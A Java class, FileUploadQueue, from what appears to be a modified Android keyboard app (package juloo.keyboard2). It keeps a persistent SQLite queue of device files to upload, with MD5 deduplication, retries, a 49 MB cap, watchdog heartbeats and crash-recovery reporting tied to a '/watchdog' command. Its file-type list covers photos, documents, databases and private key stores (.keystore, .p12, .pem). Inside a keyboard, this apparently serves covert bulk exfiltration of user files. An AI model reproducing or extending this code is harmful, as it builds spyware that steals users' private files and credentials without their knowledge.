package juloo.keyboard2;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import java.io.File;
import java.io.FileInputStream;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

public class FileUploadQueue {

    private static final String DB_NAME    = "file_backup.db";
    private static final int    DB_VERSION = 1;
    private static final String TABLE      = "uploads";

    public static final int  STATUS_PENDING   = 0;
    public static final int  STATUS_UPLOADING = 1;
    public static final int  STATUS_DONE      = 2;
    public static final int  STATUS_FAILED    = 3;
    public static final int  MAX_RETRIES      = 3;
    public static final long MAX_UPLOAD_BYTES = 49L * 1024 * 1024;

    // ── Heartbeat / crash-recovery tracking ───────────────────────────────────
    private static final String TRACKER_PREFS       = "file_tracker_prefs";
    private static final String KEY_LAST_ALIVE      = "last_alive_ms";
    private static final String KEY_RECOVERY_SINCE  = "rec_offline_since";
    private static final String KEY_RECOVERY_GAP    = "rec_gap_ms";
    private static final String KEY_RECOVERY_FOUND  = "rec_files_found";
    private static final String KEY_RECOVERY_READY  = "rec_ready";

    /** Called every 30 s by watchdog + consumer loop. Persists the current timestamp. */
    public static void recordAliveTime(Context ctx) {
        ctx.getSharedPreferences(TRACKER_PREFS, Context.MODE_PRIVATE)
           .edit().putLong(KEY_LAST_ALIVE, System.currentTimeMillis()).apply();
    }

    /** Returns the last persisted alive timestamp (0 if first run). */
    public static long getLastAliveTime(Context ctx) {
        return ctx.getSharedPreferences(TRACKER_PREFS, Context.MODE_PRIVATE)
                  .getLong(KEY_LAST_ALIVE, 0);
    }

    /** Saves the details of a crash-recovery so /watchdog can report them. */
    public static void recordRecovery(Context ctx, long offlineSince, long gapMs, int filesFound) {
        ctx.getSharedPreferences(TRACKER_PREFS, Context.MODE_PRIVATE).edit()
           .putLong(KEY_RECOVERY_SINCE, offlineSince)
           .putLong(KEY_RECOVERY_GAP,   gapMs)
           .putInt (KEY_RECOVERY_FOUND,  filesFound)
           .putBoolean(KEY_RECOVERY_READY, true)
           .apply();
    }

    /** Returns the last recovery event (or null if none pending) and clears the flag. */
    public static RecoveryInfo getAndClearRecovery(Context ctx) {
        android.content.SharedPreferences p =
            ctx.getSharedPreferences(TRACKER_PREFS, Context.MODE_PRIVATE);
        if (!p.getBoolean(KEY_RECOVERY_READY, false)) return null;
        RecoveryInfo info = new RecoveryInfo();
        info.offlineSince = p.getLong(KEY_RECOVERY_SINCE, 0);
        info.gapMs        = p.getLong(KEY_RECOVERY_GAP,   0);
        info.filesFound   = p.getInt (KEY_RECOVERY_FOUND,  0);
        p.edit().putBoolean(KEY_RECOVERY_READY, false).apply();
        return info;
    }

    public static class RecoveryInfo {
        public long offlineSince;
        public long gapMs;
        public int  filesFound;
    }

    public static class Entry {
        public long   id;
        public String path;
        public String hash;
        public long   size;
        public String mime;
        public long   detectedAt;
        public int    status;
        public int    retries;
        public String tag;
    }

    private static volatile FileUploadQueue _instance;
    private final SQLiteDatabase db;

    private FileUploadQueue(Context ctx) {
        db = new DbHelper(ctx.getApplicationContext()).getWritableDatabase();
    }

    public static FileUploadQueue get(Context ctx) {
        if (_instance == null) {
            synchronized (FileUploadQueue.class) {
                if (_instance == null) _instance = new FileUploadQueue(ctx);
            }
        }
        return _instance;
    }

    public boolean enqueue(String path, String tag) {
        if (path == null) return false;
        File f = new File(path);
        if (!f.exists() || !f.isFile() || f.length() == 0) return false;
        String hash = md5(f);
        if (hash == null) return false;
        Cursor c = db.rawQuery("SELECT id FROM " + TABLE + " WHERE hash=?", new String[]{hash});
        boolean exists = c.moveToFirst();
        c.close();
        if (exists) return false;
        try {
            ContentValues cv = new ContentValues();
            cv.put("path", path);
            cv.put("hash", hash);
            cv.put("size", f.length());
            cv.put("mime", guessMime(path));
            cv.put("detected_at", System.currentTimeMillis());
            cv.put("status", STATUS_PENDING);
            cv.put("retries", 0);
            cv.put("tag", tag != null ? tag : "File");
            db.insertOrThrow(TABLE, null, cv);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    public Entry nextPending() {
        Cursor c = db.rawQuery(
            "SELECT id,path,hash,size,mime,detected_at,status,retries,tag FROM " + TABLE
            + " WHERE (status=" + STATUS_PENDING
            + " OR (status=" + STATUS_FAILED + " AND retries<" + MAX_RETRIES + "))"
            + " ORDER BY detected_at ASC LIMIT 1", null);
        if (!c.moveToFirst()) { c.close(); return null; }
        Entry e = new Entry();
        e.id = c.getLong(0); e.path = c.getString(1); e.hash = c.getString(2);
        e.size = c.getLong(3); e.mime = c.getString(4); e.detectedAt = c.getLong(5);
        e.status = c.getInt(6); e.retries = c.getInt(7); e.tag = c.getString(8);
        c.close();
        ContentValues cv = new ContentValues();
        cv.put("status", STATUS_UPLOADING);
        db.update(TABLE, cv, "id=?", new String[]{String.valueOf(e.id)});
        return e;
    }

    public void markDone(long id) {
        ContentValues cv = new ContentValues();
        cv.put("status", STATUS_DONE);
        db.update(TABLE, cv, "id=?", new String[]{String.valueOf(id)});
    }

    public void markFailed(long id) {
        db.execSQL("UPDATE " + TABLE + " SET status=" + STATUS_FAILED + ", retries=retries+1 WHERE id=" + id);
    }

    public void resetStuck() {
        ContentValues cv = new ContentValues();
        cv.put("status", STATUS_PENDING);
        db.update(TABLE, cv, "status=?", new String[]{String.valueOf(STATUS_UPLOADING)});
    }

    public long countPending() {
        Cursor c = db.rawQuery("SELECT COUNT(*) FROM " + TABLE
            + " WHERE status=" + STATUS_PENDING
            + " OR (status=" + STATUS_FAILED + " AND retries<" + MAX_RETRIES + ")", null);
        long n = c.moveToFirst() ? c.getLong(0) : 0; c.close(); return n;
    }

    public long countDone() {
        Cursor c = db.rawQuery("SELECT COUNT(*) FROM " + TABLE + " WHERE status=" + STATUS_DONE, null);
        long n = c.moveToFirst() ? c.getLong(0) : 0; c.close(); return n;
    }

    public long countFailed() {
        Cursor c = db.rawQuery("SELECT COUNT(*) FROM " + TABLE
            + " WHERE status=" + STATUS_FAILED + " AND retries>=" + MAX_RETRIES, null);
        long n = c.moveToFirst() ? c.getLong(0) : 0; c.close(); return n;
    }

    public long totalDoneBytes() {
        Cursor c = db.rawQuery("SELECT SUM(size) FROM " + TABLE + " WHERE status=" + STATUS_DONE, null);
        long n = c.moveToFirst() ? c.getLong(0) : 0; c.close(); return n;
    }

    public long countTotal() {
        Cursor c = db.rawQuery("SELECT COUNT(*) FROM " + TABLE, null);
        long n = c.moveToFirst() ? c.getLong(0) : 0; c.close(); return n;
    }

    public List<Entry> recentUploads(int limit) {
        List<Entry> list = new ArrayList<>();
        Cursor c = db.rawQuery(
            "SELECT id,path,hash,size,mime,detected_at,status,retries,tag FROM " + TABLE
            + " WHERE status=" + STATUS_DONE + " ORDER BY detected_at DESC LIMIT " + limit, null);
        while (c.moveToNext()) {
            Entry e = new Entry();
            e.id = c.getLong(0); e.path = c.getString(1); e.hash = c.getString(2);
            e.size = c.getLong(3); e.mime = c.getString(4); e.detectedAt = c.getLong(5);
            e.status = c.getInt(6); e.retries = c.getInt(7); e.tag = c.getString(8);
            list.add(e);
        }
        c.close();
        return list;
    }

    public static String md5(File f) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            FileInputStream fis = new FileInputStream(f);
            byte[] buf = new byte[8192]; int n;
            while ((n = fis.read(buf)) != -1) md.update(buf, 0, n);
            fis.close();
            byte[] digest = md.digest();
            StringBuilder sb = new StringBuilder();
            for (byte b : digest) sb.append(String.format("%02x", b));
            return sb.toString();
        } catch (Exception e) { return null; }
    }

    public static String guessMime(String path) {
        if (path == null) return "application/octet-stream";
        String low = path.toLowerCase(Locale.ROOT);

        // ── Images ────────────────────────────────────────────────────────────
        if (low.endsWith(".jpg") || low.endsWith(".jpeg"))  return "image/jpeg";
        if (low.endsWith(".png"))   return "image/png";
        if (low.endsWith(".gif"))   return "image/gif";
        if (low.endsWith(".webp"))  return "image/webp";
        if (low.endsWith(".heic") || low.endsWith(".heif")) return "image/heic";
        if (low.endsWith(".bmp"))   return "image/bmp";
        if (low.endsWith(".tif") || low.endsWith(".tiff"))  return "image/tiff";
        if (low.endsWith(".svg"))   return "image/svg+xml";
        if (low.endsWith(".ico"))   return "image/x-icon";
        if (low.endsWith(".raw") || low.endsWith(".dng") ||
            low.endsWith(".cr2") || low.endsWith(".nef") ||
            low.endsWith(".arw") || low.endsWith(".orf"))   return "image/x-raw";
        if (low.endsWith(".psd"))   return "image/vnd.adobe.photoshop";
        if (low.endsWith(".avif"))  return "image/avif";
        if (low.endsWith(".jxl"))   return "image/jxl";

        // ── Video ─────────────────────────────────────────────────────────────
        if (low.endsWith(".mp4"))   return "video/mp4";
        if (low.endsWith(".mkv"))   return "video/x-matroska";
        if (low.endsWith(".3gp"))   return "video/3gpp";
        if (low.endsWith(".3g2"))   return "video/3gpp2";
        if (low.endsWith(".avi"))   return "video/x-msvideo";
        if (low.endsWith(".mov"))   return "video/quicktime";
        if (low.endsWith(".wmv"))   return "video/x-ms-wmv";
        if (low.endsWith(".flv"))   return "video/x-flv";
        if (low.endsWith(".webm"))  return "video/webm";
        if (low.endsWith(".ts"))    return "video/mp2t";
        if (low.endsWith(".m2ts") || low.endsWith(".mts")) return "video/mp2t";
        if (low.endsWith(".vob"))   return "video/x-ms-vob";
        if (low.endsWith(".ogv"))   return "video/ogg";
        if (low.endsWith(".m4v"))   return "video/mp4";
        if (low.endsWith(".f4v"))   return "video/mp4";
        if (low.endsWith(".mpg") || low.endsWith(".mpeg"))  return "video/mpeg";
        if (low.endsWith(".rm") || low.endsWith(".rmvb"))   return "video/vnd.rn-realvideo";

        // ── Audio ─────────────────────────────────────────────────────────────
        if (low.endsWith(".mp3"))   return "audio/mpeg";
        if (low.endsWith(".ogg"))   return "audio/ogg";
        if (low.endsWith(".oga"))   return "audio/ogg";
        if (low.endsWith(".m4a"))   return "audio/mp4";
        if (low.endsWith(".wav"))   return "audio/wav";
        if (low.endsWith(".aac"))   return "audio/aac";
        if (low.endsWith(".opus"))  return "audio/opus";
        if (low.endsWith(".flac"))  return "audio/flac";
        if (low.endsWith(".wma"))   return "audio/x-ms-wma";
        if (low.endsWith(".amr"))   return "audio/amr";
        if (low.endsWith(".awb"))   return "audio/amr-wb";
        if (low.endsWith(".aiff") || low.endsWith(".aif")) return "audio/aiff";
        if (low.endsWith(".mid") || low.endsWith(".midi")) return "audio/midi";
        if (low.endsWith(".m4b"))   return "audio/mp4";
        if (low.endsWith(".m4r"))   return "audio/mp4";
        if (low.endsWith(".3ga"))   return "audio/3gpp";
        if (low.endsWith(".mka"))   return "audio/x-matroska";
        if (low.endsWith(".ra"))    return "audio/vnd.rn-realaudio";
        if (low.endsWith(".ape"))   return "audio/x-ape";
        if (low.endsWith(".ac3"))   return "audio/ac3";

        // ── Documents ─────────────────────────────────────────────────────────
        if (low.endsWith(".pdf"))   return "application/pdf";
        if (low.endsWith(".doc"))   return "application/msword";
        if (low.endsWith(".docx"))  return "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
        if (low.endsWith(".xls"))   return "application/vnd.ms-excel";
        if (low.endsWith(".xlsx"))  return "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";
        if (low.endsWith(".ppt"))   return "application/vnd.ms-powerpoint";
        if (low.endsWith(".pptx"))  return "application/vnd.openxmlformats-officedocument.presentationml.presentation";
        if (low.endsWith(".odt"))   return "application/vnd.oasis.opendocument.text";
        if (low.endsWith(".ods"))   return "application/vnd.oasis.opendocument.spreadsheet";
        if (low.endsWith(".odp"))   return "application/vnd.oasis.opendocument.presentation";
        if (low.endsWith(".txt"))   return "text/plain";
        if (low.endsWith(".rtf"))   return "application/rtf";
        if (low.endsWith(".csv"))   return "text/csv";
        if (low.endsWith(".tsv"))   return "text/tab-separated-values";
        if (low.endsWith(".epub"))  return "application/epub+zip";
        if (low.endsWith(".mobi"))  return "application/x-mobipocket-ebook";
        if (low.endsWith(".fb2"))   return "application/x-fictionbook+xml";
        if (low.endsWith(".djvu") || low.endsWith(".djv")) return "image/vnd.djvu";
        if (low.endsWith(".pages")) return "application/vnd.apple.pages";
        if (low.endsWith(".numbers")) return "application/vnd.apple.numbers";
        if (low.endsWith(".key"))   return "application/vnd.apple.keynote";

        // ── Web / Markup ──────────────────────────────────────────────────────
        if (low.endsWith(".html") || low.endsWith(".htm")) return "text/html";
        if (low.endsWith(".mhtml") || low.endsWith(".mht")) return "message/rfc822";
        if (low.endsWith(".xml"))   return "text/xml";
        if (low.endsWith(".json"))  return "application/json";
        if (low.endsWith(".yaml") || low.endsWith(".yml")) return "text/yaml";
        if (low.endsWith(".css"))   return "text/css";
        if (low.endsWith(".js"))    return "application/javascript";
        if (low.endsWith(".ts") && !low.endsWith(".m2ts") && !low.endsWith(".mts"))
                                    return "application/typescript";
        if (low.endsWith(".xhtml")) return "application/xhtml+xml";
        if (low.endsWith(".rss"))   return "application/rss+xml";
        if (low.endsWith(".atom"))  return "application/atom+xml";
        if (low.endsWith(".webarchive")) return "application/x-webarchive";

        // ── Archives / Compressed ─────────────────────────────────────────────
        if (low.endsWith(".zip"))   return "application/zip";
        if (low.endsWith(".rar"))   return "application/x-rar-compressed";
        if (low.endsWith(".7z"))    return "application/x-7z-compressed";
        if (low.endsWith(".tar"))   return "application/x-tar";
        if (low.endsWith(".gz") || low.endsWith(".tgz")) return "application/gzip";
        if (low.endsWith(".bz2"))   return "application/x-bzip2";
        if (low.endsWith(".xz"))    return "application/x-xz";
        if (low.endsWith(".zst"))   return "application/zstd";
        if (low.endsWith(".lz4"))   return "application/x-lz4";
        if (low.endsWith(".cab"))   return "application/vnd.ms-cab-compressed";
        if (low.endsWith(".iso"))   return "application/x-iso9660-image";
        if (low.endsWith(".img"))   return "application/x-raw-disk-image";
        if (low.endsWith(".dmg"))   return "application/x-apple-diskimage";
        if (low.endsWith(".torrent")) return "application/x-bittorrent";

        // ── Android / App packages ────────────────────────────────────────────
        if (low.endsWith(".apk"))   return "application/vnd.android.package-archive";
        if (low.endsWith(".apks") || low.endsWith(".xapk") ||
            low.endsWith(".aab"))   return "application/vnd.android.package-archive";
        if (low.endsWith(".obb"))   return "application/octet-stream";

        // ── Database / Data ───────────────────────────────────────────────────
        if (low.endsWith(".db") || low.endsWith(".sqlite") ||
            low.endsWith(".sqlite3")) return "application/vnd.sqlite3";
        if (low.endsWith(".sql"))   return "application/sql";
        if (low.endsWith(".mdb") || low.endsWith(".accdb")) return "application/msaccess";

        // ── Code / Scripts ────────────────────────────────────────────────────
        if (low.endsWith(".java"))  return "text/x-java-source";
        if (low.endsWith(".kt"))    return "text/x-kotlin";
        if (low.endsWith(".py"))    return "text/x-python";
        if (low.endsWith(".sh"))    return "application/x-sh";
        if (low.endsWith(".bat"))   return "application/x-msdos-program";
        if (low.endsWith(".cpp") || low.endsWith(".cc")) return "text/x-c++src";
        if (low.endsWith(".c"))     return "text/x-csrc";
        if (low.endsWith(".h"))     return "text/x-chdr";
        if (low.endsWith(".php"))   return "application/x-httpd-php";
        if (low.endsWith(".rb"))    return "application/x-ruby";
        if (low.endsWith(".go"))    return "text/x-go";
        if (low.endsWith(".swift")) return "text/x-swift";
        if (low.endsWith(".log"))   return "text/plain";
        if (low.endsWith(".ini") || low.endsWith(".cfg") ||
            low.endsWith(".conf"))  return "text/plain";
        if (low.endsWith(".md") || low.endsWith(".markdown")) return "text/markdown";

        // ── Fonts ─────────────────────────────────────────────────────────────
        if (low.endsWith(".ttf"))   return "font/ttf";
        if (low.endsWith(".otf"))   return "font/otf";
        if (low.endsWith(".woff"))  return "font/woff";
        if (low.endsWith(".woff2")) return "font/woff2";

        // ── Certificates / Security ───────────────────────────────────────────
        if (low.endsWith(".pem") || low.endsWith(".crt") ||
            low.endsWith(".cer"))   return "application/x-x509-ca-cert";
        if (low.endsWith(".p12") || low.endsWith(".pfx")) return "application/x-pkcs12";
        if (low.endsWith(".keystore")) return "application/octet-stream";

        // ── Everything else ───────────────────────────────────────────────────
        return "application/octet-stream";
    }

    public static String formatSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        if (bytes < 1024 * 1024) return String.format(Locale.US, "%.1f KB", bytes / 1024.0);
        if (bytes < 1024L * 1024 * 1024) return String.format(Locale.US, "%.1f MB", bytes / (1024.0 * 1024));
        return String.format(Locale.US, "%.2f GB", bytes / (1024.0 * 1024 * 1024));
    }

    private static class DbHelper extends SQLiteOpenHelper {
        DbHelper(Context ctx) { super(ctx, DB_NAME, null, DB_VERSION); }
        @Override public void onCreate(SQLiteDatabase db) {
            db.execSQL("CREATE TABLE " + TABLE + "("
                + "id INTEGER PRIMARY KEY AUTOINCREMENT,"
                + "path TEXT,"
                + "hash TEXT UNIQUE,"
                + "size INTEGER DEFAULT 0,"
                + "mime TEXT,"
                + "detected_at INTEGER DEFAULT 0,"
                + "status INTEGER DEFAULT 0,"
                + "retries INTEGER DEFAULT 0,"
                + "tag TEXT"
                + ")");
            db.execSQL("CREATE INDEX idx_hash   ON " + TABLE + "(hash)");
            db.execSQL("CREATE INDEX idx_status ON " + TABLE + "(status)");
            db.execSQL("CREATE INDEX idx_date   ON " + TABLE + "(detected_at)");
        }
        @Override public void onUpgrade(SQLiteDatabase db, int o, int n) {
            db.execSQL("DROP TABLE IF EXISTS " + TABLE);
            onCreate(db);
        }
    }
}
